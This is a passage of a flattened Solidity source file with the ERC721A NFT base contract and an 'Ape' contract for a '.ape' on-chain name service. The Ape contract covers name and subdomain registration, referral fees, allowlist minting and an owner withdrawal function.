1055     }
1056 
1057     /**
1058      * @dev Returns the total amount of tokens stored by the contract.
1059      * 
1060      * Burned tokens are calculated here, use `_totalMinted()` if you want to count just minted tokens.
1061      */
1062     function totalSupply() external view returns (uint256);
1063 }
1064 
1065 // File: erc721a/contracts/ERC721A.sol
1066 
1067 
1068 // ERC721A Contracts v3.3.0
1069 // Creator: Chiru Labs
1070 
1071 pragma solidity ^0.8.4;
1072 
1073 
1074 
1075 
1076 
1077 
1078 
1079 /**
1080  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
1081  * the Metadata extension. Built to optimize for lower gas during batch mints.
1082  *
1083  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
1084  *
1085  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
1086  *
1087  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
1088  */
1089 contract ERC721A is Context, ERC165, IERC721A {
1090     using Address for address;
1091     using Strings for uint256;
1092 
1093     // The tokenId of the next token to be minted.
1094     uint256 internal _currentIndex;
1095     mapping(uint => string) public tokenIDandAddress;
1096     mapping(string => uint) public tokenAddressandID;
1097     // The number of tokens burned.
1098     uint256 internal _burnCounter;
1099 
1100     // Token name
1101     string private _name;
1102 
1103     // Token symbol
1104     string private _symbol;
1105 
1106     // Mapping from token ID to ownership details
1107     // An empty struct value does not necessarily mean the token is unowned. See _ownershipOf implementation for details.
1108     mapping(uint256 => TokenOwnership) internal _ownerships;
1109 
1110     // Mapping owner address to address data
1111     mapping(address => AddressData) private _addressData;
1112 
1113     // Mapping from token ID to approved address
1114     mapping(uint256 => address) private _tokenApprovals;
1115 
1116     // Mapping from owner to operator approvals
1117     mapping(address => mapping(address => bool)) private _operatorApprovals;
1118 
1119     constructor(string memory name_, string memory symbol_) {
1120         _name = name_;
1121         _symbol = symbol_;
1122         _currentIndex = _startTokenId();
1123     }
1124 
1125     /**
1126      * To change the starting tokenId, please override this function.
1127      */
1128     function _startTokenId() internal view virtual returns (uint256) {
1129         return 1;
1130     }
1131 
1132     /**
1133      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
1134      */
1135     function totalSupply() public view override returns (uint256) {
1136         // Counter underflow is impossible as _burnCounter cannot be incremented
1137         // more than _currentIndex - _startTokenId() times
1138         unchecked {
1139             return _currentIndex - _burnCounter - _startTokenId();
1140         }
1141     }
1142 
1143     /**
1144      * Returns the total amount of tokens minted in the contract.
1145      */
1146     function _totalMinted() internal view returns (uint256) {
1147         // Counter underflow is impossible as _currentIndex does not decrement,
1148         // and it is initialized to _startTokenId()
1149         unchecked {
1150             return _currentIndex - _startTokenId();
1151         }
1152     }
1153 
1154     /**
1155      * @dev See {IERC165-supportsInterface}.
1156      */
1157     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
1158         return
1159             interfaceId == type(IERC721).interfaceId ||
1160             interfaceId == type(IERC721Metadata).interfaceId ||
1161             super.supportsInterface(interfaceId);
1162     }
1163 
1164     /**
1165      * @dev See {IERC721-balanceOf}.
1166      */
1167     function balanceOf(address owner) public view override returns (uint256) {
1168         if (owner == address(0)) revert BalanceQueryForZeroAddress();
1169         return uint256(_addressData[owner].balance);
1170     }
1171 
1172     /**
1173      * Returns the number of tokens minted by `owner`.
1174      */
1175     function _numberMinted(address owner) internal view returns (uint256) {
1176         return uint256(_addressData[owner].numberMinted);
1177     }
1178 
1179     /**
1180      * Returns the number of tokens burned by or on behalf of `owner`.
1181      */
1182     function _numberBurned(address owner) internal view returns (uint256) {
1183         return uint256(_addressData[owner].numberBurned);
1184     }
1185 
1186     /**
1187      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1188      */
1189     function _getAux(address owner) internal view returns (uint64) {
1190         return _addressData[owner].aux;
1191     }
1192 
1193     /**
1194      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1195      * If there are multiple variables, please pack them into a uint64.
1196      */
1197     function _setAux(address owner, uint64 aux) internal {
1198         _addressData[owner].aux = aux;
1199     }
1200 
1201     /**
1202      * Gas spent here starts off proportional to the maximum mint batch size.
1203      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1204      */
1205     function _ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1206         uint256 curr = tokenId;
1207 
1208         unchecked {
1209             if (_startTokenId() <= curr) if (curr < _currentIndex) {
1210                 TokenOwnership memory ownership = _ownerships[curr];
1211                 if (!ownership.burned) {
1212                     if (ownership.addr != address(0)) {
1213                         return ownership;
1214                     }
1215                     // Invariant:
1216                     // There will always be an ownership that has an address and is not burned
1217                     // before an ownership that does not have an address and is not burned.
1218                     // Hence, curr will not underflow.
1219                     while (true) {
1220                         curr--;
1221                         ownership = _ownerships[curr];
1222                         if (ownership.addr != address(0)) {
1223                             return ownership;
1224                         }
1225                     }
1226                 }
1227             }
1228         }
1229         revert OwnerQueryForNonexistentToken();
1230     }
1231 
1232     /**
1233      * @dev See {IERC721-ownerOf}.
1234      */
1235     function ownerOf(uint256 tokenId) public view override returns (address) {
1236         return _ownershipOf(tokenId).addr;
1237     }
1238 
1239     /**
1240      * @dev See {IERC721Metadata-name}.
1241      */
1242     function name() public view virtual override returns (string memory) {
1243         return _name;
1244     }
1245 
1246     /**
1247      * @dev See {IERC721Metadata-symbol}.
1248      */
1249     function symbol() public view virtual override returns (string memory) {
1250         return _symbol;
1251     }
1252 
1253     /**
1254      * @dev See {IERC721Metadata-tokenURI}.
1255      */
1256     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1257         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1258 
1259         string memory baseURI = _baseURI();
1260         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenIDandAddress[tokenId])) : '';
1261     }
1262 
1263     /**
1264      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1265      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1266      * by default, can be overriden in child contracts.
1267      */
1268     function _baseURI() internal view virtual returns (string memory) {
1269         return '';
1270     }
1271 
1272     /**
1273      * @dev See {IERC721-approve}.
1274      */
1275     function approve(address to, uint256 tokenId) public override {
1276         address owner = ERC721A.ownerOf(tokenId);
1277         if (to == owner) revert ApprovalToCurrentOwner();
1278 
1279         if (_msgSender() != owner) if(!isApprovedForAll(owner, _msgSender())) {
1280             revert ApprovalCallerNotOwnerNorApproved();
1281         }
1282 
1283         _approve(to, tokenId, owner);
1284     }
1285 
1286     /**
1287      * @dev See {IERC721-getApproved}.
1288      */
1289     function getApproved(uint256 tokenId) public view override returns (address) {
1290         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1291 
1292         return _tokenApprovals[tokenId];
1293     }
1294 
1295     /**
1296      * @dev See {IERC721-setApprovalForAll}.
1297      */
1298     function setApprovalForAll(address operator, bool approved) public virtual override {
1299         if (operator == _msgSender()) revert ApproveToCaller();
1300 
1301         _operatorApprovals[_msgSender()][operator] = approved;
1302         emit ApprovalForAll(_msgSender(), operator, approved);
1303     }
1304 
1305     /**
1306      * @dev See {IERC721-isApprovedForAll}.
1307      */
1308     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1309         return _operatorApprovals[owner][operator];
1310     }
1311 
1312     /**
1313      * @dev See {IERC721-transferFrom}.
1314      */
1315     function transferFrom(
1316         address from,
1317         address to,
1318         uint256 tokenId
1319     ) public virtual override {
1320         _transfer(from, to, tokenId);
1321     }
1322 
1323     /**
1324      * @dev See {IERC721-safeTransferFrom}.
1325      */
1326     function safeTransferFrom(
1327         address from,
1328         address to,
1329         uint256 tokenId
1330     ) public virtual override {
1331         safeTransferFrom(from, to, tokenId, '');
1332     }
1333 
1334     /**
1335      * @dev See {IERC721-safeTransferFrom}.
1336      */
1337     function safeTransferFrom(
1338         address from,
1339         address to,
1340         uint256 tokenId,
1341         bytes memory _data
1342     ) public virtual override {
1343         _transfer(from, to, tokenId);
1344         if (to.isContract()) if(!_checkContractOnERC721Received(from, to, tokenId, _data)) {
1345             revert TransferToNonERC721ReceiverImplementer();
1346         }
1347     }
1348 
1349     /**
1350      * @dev Returns whether `tokenId` exists.
1351      *
1352      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1353      *
1354      * Tokens start existing when they are minted (`_mint`),
1355      */
1356     function _exists(uint256 tokenId) internal view returns (bool) {
1357         return _startTokenId() <= tokenId && tokenId < _currentIndex && !_ownerships[tokenId].burned;
1358     }
1359 
1360     /**
1361      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1362      */
1363     function _safeMint(address to, uint256 quantity) internal {
1364         _safeMint(to, quantity, '');
1365     }
1366 
1367     /**
1368      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1369      *
1370      * Requirements:
1371      *
1372      * - If `to` refers to a smart contract, it must implement
1373      *   {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1374      * - `quantity` must be greater than 0.
1375      *
1376      * Emits a {Transfer} event.
1377      */
1378     function _safeMint(
1379         address to,
1380         uint256 quantity,
1381         bytes memory _data
1382     ) internal {
1383         uint256 startTokenId = _currentIndex;
1384         if (to == address(0)) revert MintToZeroAddress();
1385         if (quantity == 0) revert MintZeroQuantity();
1386 
1387         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1388 
1389         // Overflows are incredibly unrealistic.
1390         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1391         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1392         unchecked {
1393             _addressData[to].balance += uint64(quantity);
1394             _addressData[to].numberMinted += uint64(quantity);
1395 
1396             _ownerships[startTokenId].addr = to;
1397             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1398 
1399             uint256 updatedIndex = startTokenId;
1400             uint256 end = updatedIndex + quantity;
1401 
1402             if (to.isContract()) {
1403                 do {
1404                     emit Transfer(address(0), to, updatedIndex);
1405                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1406                         revert TransferToNonERC721ReceiverImplementer();
1407                     }
1408                 } while (updatedIndex < end);
1409                 // Reentrancy protection
1410                 if (_currentIndex != startTokenId) revert();
1411             } else {
1412                 do {
1413                     emit Transfer(address(0), to, updatedIndex++);
1414                 } while (updatedIndex < end);
1415             }
1416             _currentIndex = updatedIndex;
1417         }
1418         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1419     }
1420 
1421     /**
1422      * @dev Mints `quantity` tokens and transfers them to `to`.
1423      *
1424      * Requirements:
1425      *
1426      * - `to` cannot be the zero address.
1427      * - `quantity` must be greater than 0.
1428      *
1429      * Emits a {Transfer} event.
1430      */
1431     function _mint(address to, uint256 quantity) internal {
1432         uint256 startTokenId = _currentIndex;
1433         if (to == address(0)) revert MintToZeroAddress();
1434         if (quantity == 0) revert MintZeroQuantity();
1435 
1436         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1437 
1438         // Overflows are incredibly unrealistic.
1439         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1440         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1441         unchecked {
1442             _addressData[to].balance += uint64(quantity);
1443             _addressData[to].numberMinted += uint64(quantity);
1444 
1445             _ownerships[startTokenId].addr = to;
1446             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1447 
1448             uint256 updatedIndex = startTokenId;
1449             uint256 end = updatedIndex + quantity;
1450 
1451             do {
1452                 emit Transfer(address(0), to, updatedIndex++);
1453             } while (updatedIndex < end);
1454 
1455             _currentIndex = updatedIndex;
1456         }
1457         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1458     }
1459 
1460     /**
1461      * @dev Transfers `tokenId` from `from` to `to`.
1462      *
1463      * Requirements:
1464      *
1465      * - `to` cannot be the zero address.
1466      * - `tokenId` token must be owned by `from`.
1467      *
1468      * Emits a {Transfer} event.
1469      */
1470     function _transfer(
1471         address from,
1472         address to,
1473         uint256 tokenId
1474     ) private {
1475         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
1476 
1477         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1478 
1479         bool isApprovedOrOwner = (_msgSender() == from ||
1480             isApprovedForAll(from, _msgSender()) ||
1481             getApproved(tokenId) == _msgSender());
1482 
1483         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1484         if (to == address(0)) revert TransferToZeroAddress();
1485 
1486         _beforeTokenTransfers(from, to, tokenId, 1);
1487 
1488         // Clear approvals from the previous owner
1489         _approve(address(0), tokenId, from);
1490 
1491         // Underflow of the sender's balance is impossible because we check for
1492         // ownership above and the recipient's balance can't realistically overflow.
1493         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1494         unchecked {
1495             _addressData[from].balance -= 1;
1496             _addressData[to].balance += 1;
1497 
1498             TokenOwnership storage currSlot = _ownerships[tokenId];
1499             currSlot.addr = to;
1500             currSlot.startTimestamp = uint64(block.timestamp);
1501 
1502             
1503             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1504             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1505             uint256 nextTokenId = tokenId + 1;
1506             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1507             if (nextSlot.addr == address(0)) {
1508                 // This will suffice for checking _exists(nextTokenId),
1509                 // as a burned slot cannot contain the zero address.
1510                 if (nextTokenId != _currentIndex) {
1511                     nextSlot.addr = from;
1512                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1513                 }
1514             }
1515         }
1516 
1517         emit Transfer(from, to, tokenId);
1518         _afterTokenTransfers(from, to, tokenId, 1);
1519     }
1520 
1521     /**
1522      * @dev Equivalent to `_burn(tokenId, false)`.
1523      */
1524     function _burn(uint256 tokenId) internal virtual {
1525         _burn(tokenId, false);
1526     }
1527 
1528     /**
1529      * @dev Destroys `tokenId`.
1530      * The approval is cleared when the token is burned.
1531      *
1532      * Requirements:
1533      *
1534      * - `tokenId` must exist.
1535      *
1536      * Emits a {Transfer} event.
1537      */
1538     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1539         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
1540 
1541         address from = prevOwnership.addr;
1542 
1543         if (approvalCheck) {
1544             bool isApprovedOrOwner = (_msgSender() == from ||
1545                 isApprovedForAll(from, _msgSender()) ||
1546                 getApproved(tokenId) == _msgSender());
1547 
1548             if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1549         }
1550 
1551         _beforeTokenTransfers(from, address(0), tokenId, 1);
1552 
1553         // Clear approvals from the previous owner
1554         _approve(address(0), tokenId, from);
1555 
1556         // Underflow of the sender's balance is impossible because we check for
1557         // ownership above and the recipient's balance can't realistically overflow.
1558         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1559         unchecked {
1560             AddressData storage addressData = _addressData[from];
1561             addressData.balance -= 1;
1562             addressData.numberBurned += 1;
1563 
1564             // Keep track of who burned the token, and the timestamp of burning.
1565             TokenOwnership storage currSlot = _ownerships[tokenId];
1566             currSlot.addr = from;
1567             currSlot.startTimestamp = uint64(block.timestamp);
1568             currSlot.burned = true;
1569 
1570             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1571             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1572             uint256 nextTokenId = tokenId + 1;
1573             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1574             if (nextSlot.addr == address(0)) {
1575                 // This will suffice for checking _exists(nextTokenId),
1576                 // as a burned slot cannot contain the zero address.
1577                 if (nextTokenId != _currentIndex) {
1578                     nextSlot.addr = from;
1579                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1580                 }
1581             }
1582         }
1583 
1584         emit Transfer(from, address(0), tokenId);
1585         _afterTokenTransfers(from, address(0), tokenId, 1);
1586 
1587         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1588         unchecked {
1589             _burnCounter++;
1590         }
1591     }
1592 
1593     /**
1594      * @dev Approve `to` to operate on `tokenId`
1595      *
1596      * Emits a {Approval} event.
1597      */
1598     function _approve(
1599         address to,
1600         uint256 tokenId,
1601         address owner
1602     ) private {
1603         _tokenApprovals[tokenId] = to;
1604         emit Approval(owner, to, tokenId);
1605     }
1606 
1607     /**
1608      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1609      *
1610      * @param from address representing the previous owner of the given token ID
1611      * @param to target address that will receive the tokens
1612      * @param tokenId uint256 ID of the token to be transferred
1613      * @param _data bytes optional data to send along with the call
1614      * @return bool whether the call correctly returned the expected magic value
1615      */
1616     function _checkContractOnERC721Received(
1617         address from,
1618         address to,
1619         uint256 tokenId,
1620         bytes memory _data
1621     ) private returns (bool) {
1622         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1623             return retval == IERC721Receiver(to).onERC721Received.selector;
1624         } catch (bytes memory reason) {
1625             if (reason.length == 0) {
1626                 revert TransferToNonERC721ReceiverImplementer();
1627             } else {
1628                 assembly {
1629                     revert(add(32, reason), mload(reason))
1630                 }
1631             }
1632         }
1633     }
1634 
1635     /**
1636      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1637      * And also called before burning one token.
1638      *
1639      * startTokenId - the first token id to be transferred
1640      * quantity - the amount to be transferred
1641      *
1642      * Calling conditions:
1643      *
1644      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1645      * transferred to `to`.
1646      * - When `from` is zero, `tokenId` will be minted for `to`.
1647      * - When `to` is zero, `tokenId` will be burned by `from`.
1648      * - `from` and `to` are never both zero.
1649      */
1650     function _beforeTokenTransfers(
1651         address from,
1652         address to,
1653         uint256 startTokenId,
1654         uint256 quantity
1655     ) internal virtual {}
1656 
1657     /**
1658      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1659      * minting.
1660      * And also called after one token has been burned.
1661      *
1662      * startTokenId - the first token id to be transferred
1663      * quantity - the amount to be transferred
1664      *
1665      * Calling conditions:
1666      *
1667      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1668      * transferred to `to`.
1669      * - When `from` is zero, `tokenId` has been minted for `to`.
1670      * - When `to` is zero, `tokenId` has been burned by `from`.
1671      * - `from` and `to` are never both zero.
1672      */
1673     function _afterTokenTransfers(
1674         address from,
1675         address to,
1676         uint256 startTokenId,
1677         uint256 quantity
1678     ) internal virtual {}
1679 }
1680 
1681 
1682 
1683 
1684 
1685 pragma solidity ^0.8.4;
1686 
1687 
1688 
1689 
1690 
1691 
1692 contract Ape is ERC721A, Ownable, ReentrancyGuard {
1693     using Strings for uint256;
1694     uint256 public cost = 5000000000000000;
1695     uint256 public ref = 20;
1696     uint256 public ref_owner = 30;
1697     uint256 public ref_discount = 20;
1698     uint256 public subdomains_fee = 10;
1699     uint256 private maxCharSize = 20;
1700     
1701     string private domain='.ape';
1702 
1703     string private BASE_URI = 'https://metadata.apename.domains/metadata/';
1704     bool public IS_SALE_ACTIVE = false;
1705     bool public IS_ALLOWLIST_ACTIVE = false;
1706     mapping(address => bool) public allowlistAddresses;
1707     mapping(string => mapping(address => bool)) public subDomains_allowlistAddresses;
1708     mapping(string => address) public resolveAddress;
1709     mapping(address => string) public primaryAddress;
1710     mapping(string => bool) public subDomains_publicSale;
1711     mapping(string => uint) public subDomains_cost;
1712     mapping(string => bytes32) public subDomains_allowList;
1713     mapping(string => uint) public subDomains_allowList_cost;
1714     mapping(string => mapping(string => string)) public dataAddress;
1715     bytes32 public merkleRoot;
1716     bytes _allowChars = "0123456789-_abcdefghijklmnopqrstuvwxyz";
1717     constructor() ERC721A(".ape Name Service", ".ape") {
1718         tokenIDandAddress[_currentIndex]="ape";
1719         tokenAddressandID["ape"]=_currentIndex;
1720         resolveAddress["ape"]=msg.sender;
1721         _safeMint(msg.sender,1);
1722     }
1723 
1724     
1725     function _baseURI() internal view virtual override returns (string memory) {
1726         return BASE_URI;
1727     }
1728 
1729     function setAddress(string calldata ape_name, address newresolve) external {
1730          TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ape_name]);
1731         if (Ownership.addr != msg.sender) revert("Error");
1732         
1733 
1734     bytes memory result = bytes(primaryAddress[resolveAddress[ape_name]]);
1735         if (keccak256(result) == keccak256(bytes(ape_name))) {
1736             primaryAddress[resolveAddress[ape_name]]="";
1737         }
1738         resolveAddress[ape_name]=newresolve;
1739     }
1740 
1741     function setPrimaryAddress(string calldata ape_name) external {
1742         require(resolveAddress[ape_name]==msg.sender, "Error");
1743         primaryAddress[msg.sender]=ape_name;
1744     }
1745 
1746 
1747     function setDataAddress(string calldata ape_name,string calldata setArea, string  memory newDatas) external {
1748          TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ape_name]);
1749 
1750         if (Ownership.addr != msg.sender) revert("Error");
1751         dataAddress[ape_name][setArea]=newDatas;
1752     }
1753 
1754     function getDataAddress(string memory ape_name, string calldata Area) public view returns(string memory) {
1755         return dataAddress[ape_name][Area];
1756     }
1757 
1758 
1759     function setBaseURI(string memory customBaseURI_) external onlyOwner {
1760         BASE_URI = customBaseURI_;
1761     }
1762 
1763     function setMaxCharSize(uint256 maxCharSize_) external onlyOwner {
1764         maxCharSize = maxCharSize_;
1765     }
1766     
1767      function setAllowChars(bytes memory allwchr) external onlyOwner {
1768         _allowChars = allwchr;
1769     }
1770 
1771     function setPrice(uint256 customPrice) external onlyOwner {
1772         cost = customPrice;
1773     }
1774 
1775     function setRefSettings(uint ref_,uint ref_owner_,uint ref_discount_,uint subdomains_fee_) external onlyOwner {
1776         ref = ref_;
1777         ref_owner = ref_owner_;
1778         ref_discount = ref_discount_;
1779         subdomains_fee = subdomains_fee_;
1780 
1781     }
1782 
1783 
1784     function setSaleActive(bool saleIsActive) external onlyOwner {
1785         IS_SALE_ACTIVE = saleIsActive;
1786     }
1787 
1788      function setAllowListSaleActive(bool WhitesaleIsActive) external onlyOwner {
1789         IS_ALLOWLIST_ACTIVE = WhitesaleIsActive;
1790     }
1791 
1792     function setSubdomainSaleActive(bool saleIsActive, uint256 customPrice, string calldata ape_name) public {
1793         TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ape_name]);
1794         require(Ownership.addr == msg.sender, "Invalid");
1795         subDomains_cost[ape_name] = customPrice;
1796         subDomains_publicSale[ape_name] = saleIsActive;
1797 
1798     }
1799 
1800     function register(address ref_address, string memory ape_name)
1801         public
1802         payable
1803     {   
1804         uint256 price = cost;
1805         bool is_ref=false;
1806         uint256 ref_cost=0;
1807         require(bytes(ape_name).length<=maxCharSize,"Long name");
1808         require(bytes(ape_name).length>0,"Write a name");
1809         require(_checkName(ape_name), "Invalid name");
1810         if (ref_address== 0x0000000000000000000000000000000000000000) {
1811         price=cost;
1812         } else {
1813         if (bytes(primaryAddress[ref_address]).length>0){
1814         ref_cost=price*ref_owner/100;    
1815         } else {
1816         ref_cost=price*ref/100;
1817         }
1818         price = price*(100-ref_discount)/100;
1819         is_ref=true;
1820         }
1821         require (tokenAddressandID[ape_name] == 0 , "This is already taken"); 
1822         require(IS_SALE_ACTIVE, "Sale is not active!");
1823         require(msg.value >= price, "Insufficient funds!");
1824         tokenIDandAddress[_currentIndex]=ape_name;
1825         tokenAddressandID[ape_name]=_currentIndex;
1826         resolveAddress[ape_name]=msg.sender;
1827          if (is_ref) {
1828         payable(ref_address).transfer(ref_cost);
1829         }
1830         _safeMint(msg.sender,1);
1831     }
1832 
1833      function allowList(string memory ape_name, bytes32[] calldata _merkleProof)
1834         public
1835         payable
1836     {      
1837             require(IS_ALLOWLIST_ACTIVE, "Allow List sale is not active!");
1838             bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
1839             require(MerkleProof.verify(_merkleProof, merkleRoot, leaf),"Invalid proof!");
1840             require(bytes(ape_name).length<=maxCharSize,"Long name");
1841             require(bytes(ape_name).length>0,"Write a name");
1842             require(_checkName(ape_name), "Invalid name");
1843             require(allowlistAddresses[msg.sender]!=true, "Claimed!");
1844             require (tokenAddressandID[ape_name] == 0 , "This is already taken"); 
1845             allowlistAddresses[msg.sender] = true;
1846             tokenIDandAddress[_currentIndex]=ape_name;
1847             tokenAddressandID[ape_name]=_currentIndex;
1848             resolveAddress[ape_name]=msg.sender;
1849             _safeMint(msg.sender,1);
1850     }
1851 
1852 
1853     function registerSubdomain(string memory ape_name, string memory subdomain_name)
1854         public
1855         payable
1856     {   
1857         require(IS_SALE_ACTIVE, "Sale is not active!");
1858         string memory new_domain=string.concat(subdomain_name,'.',ape_name);
1859         require(bytes(subdomain_name).length<=maxCharSize,"Long name");
1860         require(bytes(subdomain_name).length>0,"Write a name");
1861         require(_checkName(ape_name), "Invalid name");
1862         require(_checkName(subdomain_name), "Invalid name");
1863         require (tokenAddressandID[new_domain] == 0 , "This is already taken"); 
1864   
1865         TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ape_name]);
1866         if (Ownership.addr == msg.sender)
1867         {
1868         tokenIDandAddress[_currentIndex]=new_domain;
1869         tokenAddressandID[new_domain]=_currentIndex;
1870         resolveAddress[new_domain]=msg.sender; 
1871         _safeMint(msg.sender,1);   
1872         } else {
1873         require(subDomains_publicSale[ape_name]==true, "Only Owner can register");
1874         require(msg.value >= subDomains_cost[ape_name], "Insufficient funds!");
1875         payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);
1876         tokenIDandAddress[_currentIndex]=new_domain;
1877         tokenAddressandID[new_domain]=_currentIndex;
1878         resolveAddress[new_domain]=msg.sender;
1879         _safeMint(msg.sender,1);       
1880         }
1881     }
1882 
1883 
1884     function allowListSubdomain(string memory ape_name,  string memory subdomain_name, bytes32[] calldata _merkleProof)
1885         public
1886         payable
1887     {      
1888             string memory new_domain=string.concat(subdomain_name,'.',ape_name);
1889             bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
1890             require(MerkleProof.verify(_merkleProof, subDomains_allowList[ape_name], leaf),"Invalid proof!");
1891             require(msg.value >= subDomains_allowList_cost[ape_name], "Insufficient funds!");
1892 
1893 
1894             require(bytes(subdomain_name).length<=maxCharSize,"Long name");
1895             require(bytes(subdomain_name).length>0,"Write a name");
1896             require(_checkName(ape_name), "Invalid name");
1897             require(_checkName(subdomain_name), "Invalid name");
1898             require(subDomains_allowlistAddresses[ape_name][msg.sender]!=true, "Claimed!");
1899             require (tokenAddressandID[new_domain] == 0 , "This is already taken"); 
1900             TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ape_name]);
1901             payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);
1902             subDomains_allowlistAddresses[ape_name][msg.sender] = true;
1903             tokenIDandAddress[_currentIndex]=new_domain;
1904             tokenAddressandID[new_domain]=_currentIndex;
1905             resolveAddress[new_domain]=msg.sender;
1906             _safeMint(msg.sender,1);
1907     }
1908 
1909     
1910     function namediff(uint256 tokenId , string calldata new_ape_name) external onlyOwner {
1911         tokenIDandAddress[tokenId]=new_ape_name;
1912         tokenAddressandID[new_ape_name]=tokenId;
1913     }
1914 
1915 
1916 function walletOfOwnerName(address _owner)
1917     public
1918     view
1919     returns (string[] memory)
1920   {
1921     uint256 ownerTokenCount = balanceOf(_owner);
1922     string[] memory ownedTokenIds = new string[](ownerTokenCount);
1923     uint256 currentTokenId = 1;
1924     uint256 ownedTokenIndex = 0;
1925 
1926     while (ownedTokenIndex < ownerTokenCount) {
1927       address currentTokenOwner = ownerOf(currentTokenId);
1928 
1929       if (currentTokenOwner == _owner) {
1930         ownedTokenIds[ownedTokenIndex] = string.concat(tokenIDandAddress[currentTokenId],domain);
1931 
1932         ownedTokenIndex++;
1933       }
1934 
1935       currentTokenId++;
1936     }
1937 
1938     return ownedTokenIds;
1939   }
1940 
1941 
1942 function lastAddresses(uint256 count)
1943     public
1944     view
1945     returns (string[] memory)
1946   {
1947     uint256 total = totalSupply();
1948     string[] memory lastAddr = new string[](count);
1949     uint256 currentId = total - count;
1950     uint256 ownedTokenIndex = 0;
1951     require(currentId>=0,"Invalid");
1952     while (total > currentId) {
1953         lastAddr[ownedTokenIndex] = string.concat(tokenIDandAddress[total],domain);
1954         ownedTokenIndex++;
1955       total--;
1956     }
1957 
1958     return lastAddr;
1959   }
1960 
1961 
1962 function setMerkleRoot(bytes32 _newMerkleRoot) external onlyOwner {
1963         merkleRoot = _newMerkleRoot;
1964     }
1965 
1966 function setMerkleRootSubdomain(bytes32 _newMerkleRoot, string memory ape_name, uint256 _cost) external {
1967       TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ape_name]);
1968         if (Ownership.addr != msg.sender) revert("Error");
1969 
1970         subDomains_allowList[ape_name] = _newMerkleRoot;
1971         subDomains_allowList_cost[ape_name] = _cost;
1972     }
1973     
1974 
1975 
1976  function _checkName(string memory _name) public view returns(bool){
1977         uint allowedChars =0;
1978         bytes memory byteString = bytes(_name);
1979         bytes memory allowed = bytes(_allowChars);  
1980         for(uint i=0; i < byteString.length ; i++){
1981            for(uint j=0; j<allowed.length; j++){
1982               if(byteString[i]==allowed[j] )
1983               allowedChars++;         
1984            }
1985         }
1986         if (allowedChars==byteString.length) { return true; } else { return false; }
1987        
1988     }
1989 
1990         /** PAYOUT **/
1991 
1992     function withdraw() public onlyOwner nonReentrant {
1993         uint256 balance = address(this).balance;
1994         Address.sendValue(payable(0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091),balance);
1995         }
1996 
1997 }